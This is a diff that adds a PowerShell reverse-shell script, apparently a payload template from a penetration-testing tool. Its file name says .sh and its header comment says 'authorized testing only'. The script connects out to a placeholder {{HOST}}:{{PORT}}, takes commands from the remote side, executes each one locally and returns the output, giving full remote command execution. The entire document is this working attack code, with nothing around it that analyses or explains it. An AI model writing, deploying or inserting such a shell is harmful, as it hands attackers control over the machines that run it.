@@ -1,0 +1,27 @@
+# getrev.sh: authorized testing only
+$client = New-Object System.Net.Sockets.TcpClient
+$stream = $reader = $writer = $null
+try {
+    $client.Connect('{{HOST}}', {{PORT}})
+    $stream = $client.GetStream()
+    $encoding = New-Object System.Text.UTF8Encoding($false)
+    $reader = New-Object System.IO.StreamReader($stream, $encoding)
+    $writer = New-Object System.IO.StreamWriter($stream, $encoding)
+    $writer.AutoFlush = $true
+
+    $writer.Write("PS " + (Get-Location).Path + "> ")
+    while (($command = $reader.ReadLine()) -ne $null) {
+        if ($command -eq 'exit') { break }
+        try {
+            $output = (& ([scriptblock]::Create($command)) 2>&1 | Out-String)
+        } catch {
+            $output = ($_ | Out-String)
+        }
+        $writer.Write($output + "PS " + (Get-Location).Path + "> ")
+    }
+} finally {
+    if ($writer) { $writer.Dispose() }
+    if ($reader) { $reader.Dispose() }
+    if ($stream) { $stream.Dispose() }
+    $client.Dispose()
+}
